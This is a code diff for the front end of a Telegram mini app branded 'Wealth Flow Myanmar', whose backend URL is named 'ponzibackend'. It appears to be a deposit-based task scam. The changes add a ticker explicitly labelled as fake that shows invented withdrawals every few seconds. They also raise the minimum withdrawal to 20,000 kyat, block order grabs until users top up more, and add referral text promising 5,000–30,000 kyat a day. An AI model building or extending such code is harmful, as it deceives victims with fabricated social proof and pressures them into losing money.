 
 const BACKEND_URL  = "https://ponzibackend.onrender.com";
 const BOT_USERNAME = "wealthflowmyanmar_bot";
 
-// ── VIP product image ranges ──────────────────────
-// VIP-1: p1.png → p5.png   (5 products)
-// VIP-2: p1.png → p15.png  (all 15 products)
+// ── Product names (Myanmar) ───────────────────────
+const PRODUCT_NAMES = {
+  p1:  "သွားတိုက်တံ",  p2:  "သွားတိုက်ဆေး",
+  p3:  "ဖိနပ်",          p4:  "ရေချိုးခန်းအခင်း",
+  p5:  "မြက်အခင်း",      p6:  "အိပ်ရာခင်း",
+  p7:  "မျက်နှာသုတ်ပဝါ", p8:  "ဆပ်ပြာ",
+  p9:  "ရေနံဆီ",         p10: "ဆံပင်သုတ်ပဝါ",
+  p11: "ပန်းကန်",         p12: "ဇွန်း",
+  p13: "ဖန်ခွက်",         p14: "ဆန်ခြင်းတောင်း",
+  p15: "ထမင်းအိုး",
+};
+
+// ── VIP image ranges ──────────────────────────────
 const VIP_IMAGES = {
   1: [1,2,3,4,5],
   2: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15],
@@ -1697,17 +1820,52 @@ const VIP_IMAGES = {
 
 // ── App State ────────────────────────────────────
 let state = {
-  telegram_id:        null,
-  username:           "Guest",
-  first_name:         "Guest",
-  balance:            0,
-  commission:         0,
-  vip_level:          0,
-  daily_orders:       0,
-  referral_link:      "",
-  pendingProduct:     null,
-  commissionHistory:  [],
+  telegram_id:       null,
+  username:          "Guest",
+  first_name:        "Guest",
+  balance:           0,
+  commission:        0,
+  vip_level:         0,
+  daily_orders:      0,
+  referral_link:     "",
+  pendingProduct:    null,
+  commissionHistory: [],
 };
+
+// ================================================
+//   FAKE WITHDRAWAL NOTIFICATIONS (Fix 5)
+//   ၅ စက္ကန့်တစ်ကြိမ် ကျပန်းဖော်ပြမည်
+// ================================================
+const FAKE_NOTIFICATIONS = [
+  { phone: "+959*******96", amount: "5,000" },
+  { phone: "+959*******12", amount: "20,000" },
+  { phone: "+959*******47", amount: "10,000" },
+  { phone: "+959*******83", amount: "15,000" },
+  { phone: "+959*******29", amount: "8,000" },
+  { phone: "+959*******55", amount: "25,000" },
+  { phone: "+959*******71", amount: "12,000" },
+];
+
+function showFakeNotification() {
+  const notif  = FAKE_NOTIFICATIONS[Math.floor(Math.random() * FAKE_NOTIFICATIONS.length)];
+  const ticker = document.getElementById("fake-notif-ticker");
+  const text   = document.getElementById("fake-notif-text");
+
+  text.innerHTML = `${notif.phone} က <strong>${notif.amount} ကျပ်</strong> ထုတ်ယူသွားပါပြီ ✅`;
+  ticker.classList.add("show");
+
+  setTimeout(() => {
+    ticker.classList.remove("show");
+  }, 3500);
+}
+
+// Start fake notifications — every 5 seconds
+function startFakeNotifications() {
+  setTimeout(() => {
+    showFakeNotification();
+    setInterval(showFakeNotification, 5000);
+  }, 3000);
+}
 
 // ================================================
 //   INIT
@@ -1743,7 +1901,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     // Dev fallback
     state.telegram_id = 12345678;
     state.username    = "DevMode";
-    state.balance     = 99999; // dev: pre-fund for testing
+    state.balance     = 25000;
     document.getElementById("username-display").textContent = "DevMode";
     document.getElementById("account-id").textContent  = "****5678";
     document.getElementById("profile-id").textContent  = "ID: ****5678";
@@ -1755,6 +1913,7 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   animateMenuItems();
   updateUI();
+  startFakeNotifications();   // Fix 5: Start fake withdrawal ticker
 });
 
 // ================================================
@@ -1800,31 +1959,31 @@ function applyUserData(user) {
 }
 
 // ================================================
-//   UI UPDATE  (called after every state change)
+//   UI UPDATE
 // ================================================
 function updateUI() {
-  // ── Balance displays ──
   document.getElementById("balance-display").textContent    = state.balance.toLocaleString();
-  // VIP Tab balance display
   const vtb = document.getElementById("vip-tab-balance");
   if (vtb) vtb.textContent = state.balance.toLocaleString();
+
   // VIP compare hints
   const c1 = document.getElementById("vip1-compare");
   const c2 = document.getElementById("vip2-compare");
   if (c1 && state.vip_level < 1) {
     const diff1 = 5000 - state.balance;
     c1.textContent = diff1 > 0
-      ? `လက်ကျန်: ${state.balance.toLocaleString()} ကျပ် (${diff1.toLocaleString()} ကျပ် လိုသေးသည်)`
-      : `✅ ဝယ်ယူနိုင်သည် (လက်ကျန်: ${state.balance.toLocaleString()} ကျပ်)`;
+      ? `လက်ကျန်: ${state.balance.toLocaleString()} (${diff1.toLocaleString()} လိုသေး)`
+      : `✅ ဝယ်နိုင်သည် (${state.balance.toLocaleString()} ကျပ်)`;
     c1.style.color = diff1 > 0 ? '#f87171' : '#4ade80';
   } else if (c1) { c1.textContent = ''; }
   if (c2 && state.vip_level < 2) {
     const diff2 = 20000 - state.balance;
     c2.textContent = diff2 > 0
-      ? `လက်ကျန်: ${state.balance.toLocaleString()} ကျပ် (${diff2.toLocaleString()} ကျပ် လိုသေးသည်)`
-      : `✅ ဝယ်ယူနိုင်သည် (လက်ကျန်: ${state.balance.toLocaleString()} ကျပ်)`;
+      ? `လက်ကျန်: ${state.balance.toLocaleString()} (${diff2.toLocaleString()} လိုသေး)`
+      : `✅ ဝယ်နိုင်သည် (${state.balance.toLocaleString()} ကျပ်)`;
     c2.style.color = diff2 > 0 ? '#f87171' : '#4ade80';
   } else if (c2) { c2.textContent = ''; }
+
   document.getElementById("commission-display").textContent = state.commission.toLocaleString();
   document.getElementById("stat-balance").textContent       = state.balance.toLocaleString();
   document.getElementById("stat-commission").textContent    = state.commission.toLocaleString();
@@ -1832,16 +1991,14 @@ function updateUI() {
   document.getElementById("stat-orders").textContent        = state.daily_orders;
   document.getElementById("withdraw-balance").textContent   = state.balance.toLocaleString();
 
-  // ── Daily counter ──
   const limit = state.vip_level === 1 ? 10 : state.vip_level === 2 ? 20 : 0;
   document.getElementById("daily-count").textContent     = state.daily_orders;
   document.getElementById("daily-max").textContent       = limit || "0";
   document.getElementById("daily-limit-text").textContent =
     state.vip_level
       ? `VIP-${state.vip_level} (နေ့စဉ် ${limit} ကြိမ်)`
-      : "VIP ဝယ်ယူပြီးမှ Grab လုပ်နိုင်သည်";
+      : "VIP ဝယ်ယူပြီးမှ Grab လုပ်နိုင်";
 
-  // ── Hero VIP badge ──
   if (state.vip_level > 0) {
     document.getElementById("vip-badge-hero").style.display = "flex";
     document.getElementById("vip-badge-text").textContent   = `VIP-${state.vip_level}`;
@@ -1849,56 +2006,40 @@ function updateUI() {
     document.getElementById("vip-badge-hero").style.display = "none";
   }
 
-  // ── VIP buttons state ──
   updateVIPButtons();
-
-  // ── Cart tab: show lock notice or product gallery ──
   updateCartSection();
 }
 
-// ─── VIP Buttons ────────────────────────────────
-// ─────────────────────────────────────────────────────────────────────────
-//  updateVIPButtons
-//  FIX: Buttons are ALWAYS visible regardless of balance.
-//       Balance is checked only when the user clicks (inside buyVIP).
-//       Only "owned" VIP level gets the disabled/owned state.
-// ─────────────────────────────────────────────────────────────────────────
+// ─── VIP Buttons ─────────────────────────────────
 function updateVIPButtons() {
   const btn1 = document.getElementById("vip1-btn");
   const btn2 = document.getElementById("vip2-btn");
-
   if (!btn1 || !btn2) return;
 
-  // ── VIP-1 button ──
   if (state.vip_level >= 1) {
-    // Already owns VIP-1: show owned state
     btn1.innerHTML = "<i class='fa-solid fa-check'></i> VIP-1 ပိုင်ဆိုင်ပြီး";
-    btn1.classList.add("owned");
-    btn1.classList.remove("loading");
-    btn1.disabled = true;   // only disabled when already owned
+    btn1.classList.add("owned"); btn1.classList.remove("loading");
+    btn1.disabled = true;
     hideInsufficientCard(1);
   } else {
-    // Not yet owned: button always clickable, balance check happens on click
     btn1.innerHTML = "💳 ဝယ်မည် (5,000 ကျပ်)";
     btn1.classList.remove("owned", "loading");
-    btn1.disabled = false;  // ALWAYS enabled so user can click
+    btn1.disabled = false;  // Always enabled
   }
 
-  // ── VIP-2 button ──
   if (state.vip_level >= 2) {
     btn2.innerHTML = "<i class='fa-solid fa-check'></i> VIP-2 ပိုင်ဆိုင်ပြီး";
-    btn2.classList.add("owned");
-    btn2.classList.remove("loading");
-    btn2.disabled = true;   // only disabled when already owned
+    btn2.classList.add("owned"); btn2.classList.remove("loading");
+    btn2.disabled = true;
     hideInsufficientCard(2);
   } else {
     btn2.innerHTML = "💳 ဝယ်မည် (20,000 ကျပ်)";
     btn2.classList.remove("owned", "loading");
-    btn2.disabled = false;  // ALWAYS enabled so user can click
+    btn2.disabled = false;  // Always enabled
   }
 }
 
-// ─── Cart Section: lock vs gallery ──────────────
+// ─── Cart Section ────────────────────────────────
 function updateCartSection() {
   const lockEl    = document.getElementById("vip-lock-notice");
   const galleryEl = document.getElementById("vip-products-section");
@@ -1913,7 +2054,7 @@ function updateCartSection() {
   }
 }
 
-// ─── Render product image gallery ───────────────
+// ─── Product Gallery ─────────────────────────────
 function renderProductGallery(vipLevel) {
   const badgeEl  = document.getElementById("gallery-vip-badge");
   const textEl   = document.getElementById("gallery-vip-text");
@@ -1922,12 +2063,9 @@ function renderProductGallery(vipLevel) {
 
   badgeEl.textContent = `VIP-${vipLevel}`;
   titleEl.textContent = `VIP-${vipLevel} ပစ္စည်းများ`;
-
-  if (vipLevel === 1) {
-    textEl.textContent = "VIP-1 ပစ္စည်း p1–p5 Grab လုပ်နိုင်သည်";
-  } else {
-    textEl.textContent = "VIP-2 ပစ္စည်း p1–p15 အားလုံး Grab လုပ်နိုင်သည်";
-  }
+  textEl.textContent  = vipLevel === 1
+    ? "VIP-1 ပစ္စည်း p1–p5 Grab လုပ်နိုင်သည်"
+    : "VIP-2 ပစ္စည်း p1–p15 အားလုံး Grab လုပ်နိုင်သည်";
 
   const imgNums = VIP_IMAGES[vipLevel] || VIP_IMAGES[1];
 
@@ -1935,13 +2073,13 @@ function renderProductGallery(vipLevel) {
     <div class="product-card">
       <img
         src="/images/p${n}.png"
-        alt="Product ${n}"
+        alt="${PRODUCT_NAMES['p'+n] || 'Product '+n}"
         loading="lazy"
         onerror="this.src='https://via.placeholder.com/200x200/fce4ec/e91e63?text=P${n}'"
       />
       <div class="product-card-info">
-        <div class="product-card-id">P${n}</div>
-        <div class="product-card-label">Order Grab ပစ္စည်း</div>
+        <div class="product-card-name">${PRODUCT_NAMES['p'+n] || 'Product '+n}</div>
+        <div class="product-card-label">Grab လုပ်နိုင်သည်</div>
       </div>
     </div>
   `).join("");
@@ -1963,20 +2101,21 @@ function navTo(tab, el) {
       document.querySelectorAll(".nav-item")[tabIdx[tab]].classList.add("active");
     }
   }
-
   window.Telegram?.WebApp?.HapticFeedback?.selectionChanged();
 }
 
 // ================================================
 //   ORDER GRAB
+//   v5: Balance စစ်ဆေးမှုပါဝင် (ပစ္စည်းဈေးနှုန်း ရှိမှ Grab ရ)
 // ================================================
 let pendingOrder = null;
 
 async function grabOrder() {
   if (!state.telegram_id)  return showToast("⚠️ Telegram မှ ဝင်ရောက်ပါ", "error");
-  if (!state.vip_level)    return showToast("⚠️ VIP ဝယ်ယူမှသာ Order Grab လုပ်နိုင်သည်", "error");
+  if (!state.vip_level)    return showToast("⚠️ VIP ဝယ်ယူမှသာ Order Grab လုပ်နိုင်", "error");
 
   const btn = document.getElementById("grab-btn");
+  hideOrderAlert();
   btn.disabled  = true;
   btn.innerHTML = `<span class="spinner"></span> ရှာဖွေနေသည်...`;
 
@@ -1989,7 +2128,13 @@ async function grabOrder() {
     const data = await res.json();
 
     if (!data.success) {
-      showToast(data.error || "⚠️ Order Grab မအောင်မြင်ပါ", "error");
+      // Balance insufficient for product price
+      if (data.insufficient) {
+        showOrderAlert(data.required, data.current_balance, data.shortfall);
+        showToast(`⚠️ Balance မလုံ (ပစ္စည်းဈေး: ${data.required?.toLocaleString()} ကျပ်)`, "error");
+      } else {
+        showToast(data.error || "⚠️ Order Grab မအောင်မြင်ပါ", "error");
+      }
       btn.disabled  = false;
       btn.innerHTML = `<i class="fa-solid fa-bolt"></i> Order Grab လုပ်ရန်`;
       return;
@@ -1997,12 +2142,12 @@ async function grabOrder() {
 
     pendingOrder = data;
     const prod   = data.product;
-
-    // Use local image path matching p1.png pattern
     const imgNum = prod.id.replace("p", "");
-    document.getElementById("order-img").src              = `/images/p${imgNum}.png`;
-    document.getElementById("order-price").textContent    = prod.price.toLocaleString();
-    document.getElementById("order-commission").textContent = data.commission.toLocaleString();
+
+    document.getElementById("order-img").src                = `/images/p${imgNum}.png`;
+    document.getElementById("order-product-name").textContent = PRODUCT_NAMES[prod.id] || prod.name || prod.id;
+    document.getElementById("order-price").textContent       = prod.price.toLocaleString();
+    document.getElementById("order-commission").textContent  = data.commission.toLocaleString();
 
     document.getElementById("order-result").classList.add("show");
     window.Telegram?.WebApp?.HapticFeedback?.impactOccurred("medium");
@@ -2015,18 +2160,31 @@ async function grabOrder() {
   btn.innerHTML = `<i class="fa-solid fa-bolt"></i> Order Grab လုပ်ရန်`;
 }
 
+function showOrderAlert(required, current, shortfall) {
+  const el   = document.getElementById("order-balance-alert");
+  const desc = document.getElementById("order-alert-desc");
+  desc.innerHTML =
+    `ပစ္စည်းဈေးနှုန်း: <strong>${required?.toLocaleString() || "?"} ကျပ်</strong><br>` +
+    `လက်ကျန်ငွေ: <strong>${current?.toLocaleString() || state.balance.toLocaleString()} ကျပ်</strong><br>` +
+    `နောက်ထပ် <strong style="color:var(--red)">${shortfall?.toLocaleString() || "?"} ကျပ်</strong> ဖြည့်ပါ`;
+  el.classList.add("show");
+}
+
+function hideOrderAlert() {
+  document.getElementById("order-balance-alert").classList.remove("show");
+}
+
 function submitOrder() {
   if (!pendingOrder) return;
 
   const commission = pendingOrder.commission;
-
   state.balance      = pendingOrder.new_balance;
   state.daily_orders = pendingOrder.daily_orders;
   state.commission  += commission;
 
   const now = new Date();
   state.commissionHistory.unshift({
-    product: pendingOrder.product.id,
+    product: PRODUCT_NAMES[pendingOrder.product.id] || pendingOrder.product.id,
     amount:  commission,
     date:    now.toLocaleString("my-MM"),
   });
@@ -2037,7 +2195,7 @@ function submitOrder() {
   document.getElementById("order-result").classList.remove("show");
   pendingOrder = null;
 
-  showToast(`🎉 အော်ဒါတင်ခြင်း အောင်မြင်! Commission +${commission.toLocaleString()} ကျပ်`, "success");
+  showToast(`🎉 အော်ဒါ Submit! Commission +${commission.toLocaleString()} ကျပ်`, "success");
   window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred("success");
 }
 
@@ -2049,7 +2207,7 @@ function updateHistory() {
       <div class="history-left">
         <div class="history-dot" style="background:${colors[i % colors.length]}"></div>
         <div class="history-info">
-          <span class="history-id">${h.product.toUpperCase()}</span>
+          <span class="history-id">${h.product}</span>
           <span class="history-date">${h.date}</span>
         </div>
       </div>
@@ -2060,30 +2218,19 @@ function updateHistory() {
 }
 
 // ================================================
-//   VIP – INSTANT PURCHASE
-//   FIX: Button is always shown. Balance is checked by Backend only.
-//   On click → call API → API checks balance → show result.
-//   Balance deduction & vip_level upgrade done in backend.
-//   Frontend updates balance display immediately on success.
+//   VIP PURCHASE
 // ================================================
 async function buyVIP(level) {
-  // Already owns: just show toast, don't disable button before this check
-  if (state.vip_level >= level) {
+  if (state.vip_level >= level)
     return showToast(`✅ VIP-${level} ပိုင်ဆိုင်ပြီး ဖြစ်သည်`, "success");
-  }
-
-  if (!state.telegram_id) {
+  if (!state.telegram_id)
     return showToast("⚠️ Telegram မှ ဝင်ရောက်ပါ", "error");
-  }
 
-  const cost  = level === 1 ? 5000 : 20000;
-  const btn   = document.getElementById(`vip${level}-btn`);
-
-  // Show loading state (but button stays in DOM, not permanently disabled)
+  const btn     = document.getElementById(`vip${level}-btn`);
   const origTxt = btn.innerHTML;
   btn.classList.add("loading");
   btn.disabled  = true;
-  btn.innerHTML = `<span class="spinner"></span> ဝယ်ယူနေသည်...`;
+  btn.innerHTML = `<span class="spinner"></span> ဝယ်နေသည်...`;
   hideInsufficientCard(level);
 
   try {
@@ -2095,58 +2242,49 @@ async function buyVIP(level) {
     const data = await res.json();
 
     if (data.success) {
-      // ── (3) Balance Deduction: update frontend with new balance from backend ──
-      state.balance   = data.new_balance;  // backend already deducted the cost
-      state.vip_level = data.vip_level;    // vip_level upgraded by backend
+      state.balance   = data.new_balance;
+      state.vip_level = data.vip_level;
       updateUI();
       updateCartSection();
       window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred("success");
 
-      // Show success popup
       const overlay = document.getElementById("vip-success-overlay");
       const title   = document.getElementById("vip-success-title");
       const costEl  = document.getElementById("vip-success-cost");
       if (title)  title.textContent  = `VIP Level ${level} ဝယ်ယူမှု အောင်မြင်ပါသည်`;
       if (costEl) costEl.textContent = `${data.cost ? data.cost.toLocaleString() : (level===1?'5,000':'20,000')} ကျပ်`;
-      if (overlay) { overlay.style.display = "flex"; }
-      return;  // updateUI() calls updateVIPButtons() which resets button state
+      if (overlay) overlay.style.display = "flex";
+      return;
     }
 
-    // ── Insufficient balance: show beautiful card + toast ──
     if (data.insufficient) {
-      showInsufficientCard(level, data.current_balance, cost);
-      // Beautiful styled insufficient balance toast
+      showInsufficientCard(level, data.current_balance, level===1?5000:20000);
       showToast("❌ လက်ကျန်ငွေ မလုံလောက်ပါ။ ကျေးဇူးပြု၍ ငွေအရင်ဖြည့်ပါ", "error");
     } else {
       showToast(data.error || "⚠️ မအောင်မြင်ပါ", "error");
     }
-
   } catch (err) {
     showToast("⚠️ ဆာဗာနှင့် ချိတ်ဆက်မရပါ", "error");
   }
 
-  // Restore button to clickable state (not owned, not loading)
   btn.classList.remove("loading");
   btn.disabled  = false;
   btn.innerHTML = origTxt;
 }
 
-// ── Close VIP success popup and go to cart ────────
 function closeVIPSuccessPopup() {
-  const overlay = document.getElementById("vip-success-overlay");
-  if (overlay) overlay.style.display = "none";
+  document.getElementById("vip-success-overlay").style.display = "none";
   navTo("cart");
 }
 
-// ── Show/hide insufficient balance notice ─────────
 function showInsufficientCard(level, currentBalance, cost) {
   const card = document.getElementById(`vip${level}-insufficient`);
   const desc = document.getElementById(`vip${level}-insufficient-desc`);
   const shortfall = cost - currentBalance;
   desc.innerHTML =
     `လက်ကျန်ငွေ: <strong>${currentBalance.toLocaleString()} ကျပ်</strong><br>` +
-    `လိုအပ်သည်: <strong>${cost.toLocaleString()} ကျပ်</strong><br>` +
-    `နောက်ထပ် <strong style="color:var(--red)">${shortfall.toLocaleString()} ကျပ်</strong> ဖြည့်ပါ`;
+    `လိုအပ်: <strong>${cost.toLocaleString()} ကျပ်</strong><br>` +
+    `<strong style="color:var(--red)">${shortfall.toLocaleString()} ကျပ်</strong> ဖြည့်ပါ`;
   card.classList.add("show");
 }
 
@@ -2154,9 +2292,7 @@ function hideInsufficientCard(level) {
   document.getElementById(`vip${level}-insufficient`).classList.remove("show");
 }
 
-function closeVIPInsufficient(level) {
-  hideInsufficientCard(level);
-}
+function closeVIPInsufficient(level) { hideInsufficientCard(level); }
 
 // ================================================
 //   TOPUP
@@ -2168,9 +2304,8 @@ function openTopup() {
 
 async function confirmTopup() {
   const amount = parseInt(document.getElementById("topup-amount-input").value);
-  if (!amount || amount < 1000) {
+  if (!amount || amount < 1000)
     return showToast("⚠️ အနည်းဆုံး ၁,၀၀၀ ကျပ် ထည့်ပါ", "error");
-  }
 
   try {
     await fetch(BACKEND_URL + "/api/deposit/request", {
@@ -2179,14 +2314,14 @@ async function confirmTopup() {
       body: JSON.stringify({ telegram_id: state.telegram_id, amount, method: "KPay/Wave" }),
     });
     closeModal("topup-modal");
-    showToast("📨 ငွေဖြည့်တောင်းဆိုမှု ပေးပို့ပြီး! Admin မှ ၁-၂ နာရီအတွင်း ဖြည့်ပေးမည်", "success");
+    showToast("📨 ငွေဖြည့်တောင်းဆိုမှု ပေးပို့ပြီး! ၁-၂ နာရီအတွင်း ဖြည့်ပေးမည်", "success");
   } catch (err) {
     showToast("⚠️ ဆာဗာနှင့် ချိတ်ဆက်မရပါ", "error");
   }
 }
 
 // ================================================
-//   WITHDRAW
+//   WITHDRAW (Fix 3: Minimum 20,000)
 // ================================================
 function openWithdraw() {
   document.getElementById("withdraw-balance").textContent = state.balance.toLocaleString();
@@ -2198,9 +2333,12 @@ async function confirmWithdraw() {
   const method  = document.getElementById("withdraw-method").value;
   const account = document.getElementById("withdraw-account").value.trim();
 
-  if (!amount || amount < 5000) return showToast("⚠️ အနည်းဆုံး ၅,၀၀၀ ကျပ် ထုတ်နိုင်သည်", "error");
-  if (amount > state.balance)   return showToast("⚠️ လက်ကျန်ငွေ မလုံလောက်ပါ", "error");
-  if (!account) return showToast("⚠️ ဖုန်းနံပါတ် ထည့်ပါ", "error");
+  if (!amount || amount < 20000)
+    return showToast("⚠️ အနည်းဆုံး ၂၀,၀၀၀ ကျပ် ထုတ်နိုင်သည်", "error");
+  if (amount > state.balance)
+    return showToast("⚠️ လက်ကျန်ငွေ မလုံလောက်ပါ", "error");
+  if (!account)
+    return showToast("⚠️ ဖုန်းနံပါတ် ထည့်ပါ", "error");
 
   try {
     const res  = await fetch(BACKEND_URL + "/api/withdraw/request", {
@@ -2221,29 +2359,40 @@ async function confirmWithdraw() {
 }
 
 // ================================================
-//   REFERRAL
+//   REFERRAL  (Fix 4: Telegram openTelegramLink)
 // ================================================
 function copyReferral() {
   copyText(state.referral_link, null);
   showToast("🔗 Referral Link ကူးပြီး!", "success");
 }
 
+// Fix 4: openTelegramLink ဖြင့် Contacts Select မှတ်ပြီး Share လုပ်မည်
 function shareReferral() {
+  const marketingText =
+    "အိမ်မှာနေရင်း ဖုန်းလေးတစ်လုံးရှိရုံနဲ့ တစ်နေ့ကို ၅,၀၀၀ ကနေ ၃၀,၀၀၀ အထိ " +
+    "အပိုဝင်ငွေရှာချင်ရင်‌‌တော့ Wealth Flow Myanmar မှာ အခုပဲအကောင့်ဖွင့်ပြီး " +
+    "ပစ္စည်းလေးတွေ Grab လုပ်ရင်း ပိုက်ဆံရှာလို့ရနေပါပြီ " +
+    "အသေးစိတ်ကို App ထဲမှာ ကြည့်ရှုနိုင်ပါတယ်!";
+
+  const shareUrl =
+    `https://t.me/share/url?text=${encodeURIComponent(marketingText)}&url=${encodeURIComponent(state.referral_link)}`;
+
   const tg = window.Telegram?.WebApp;
-  if (tg) {
-    tg.openTelegramLink(
-      `https://t.me/share/url?url=${encodeURIComponent(state.referral_link)}&text=${encodeURIComponent("🛍️ Best Buy Mini App - Commission ရမည်!")}`
-    );
+  if (tg && tg.openTelegramLink) {
+    // Telegram openTelegramLink → Contact Select UI ပေါ်မည်
+    tg.openTelegramLink(shareUrl);
   } else {
-    copyReferral();
+    // Fallback for non-Telegram environment
+    window.open(shareUrl, "_blank");
   }
+  window.Telegram?.WebApp?.HapticFeedback?.impactOccurred("light");
 }
 
 // ================================================
 //   RULES
 // ================================================
 function showRules() {
-  showToast("📋 Commission 10% • VIP ဝယ်မှ Grab • မိတ်ဆွေဖိတ် ₁,000 Bonus");
+  showToast("📋 Commission 10% • VIP ဝယ်မှ Grab • Balance ရှိမှ Order • ၂၀,၀၀၀ ကျပ်မှ ထုတ်နိုင်");
 }
 
 // ================================================
@@ -2266,7 +2415,7 @@ document.querySelectorAll(".modal-overlay").forEach(overlay => {
 });
 
 // ================================================
-//   COPY
+//   COPY HELPER
 // ================================================
 function copyText(text, btn) {
   navigator.clipboard?.writeText(text).catch(() => {
@@ -2282,12 +2431,8 @@ function copyText(text, btn) {
     const orig = btn.innerHTML;
     btn.innerHTML = `<i class="fa-solid fa-check"></i> Copied!`;
     btn.classList.add("copied");
-    setTimeout(() => {
-      btn.innerHTML = orig;
-      btn.classList.remove("copied");
-    }, 2000);
+    setTimeout(() => { btn.innerHTML = orig; btn.classList.remove("copied"); }, 2000);
   }
-
   window.Telegram?.WebApp?.HapticFeedback?.impactOccurred("light");
 }
 
@@ -2304,7 +2449,7 @@ function showToast(msg, type = "") {
 }
 
 // ================================================
-//   ANIMATE MENU
+//   ANIMATE MENU ITEMS
 // ================================================
 function animateMenuItems() {
   document.querySelectorAll(".menu-item").forEach((el, i) => {
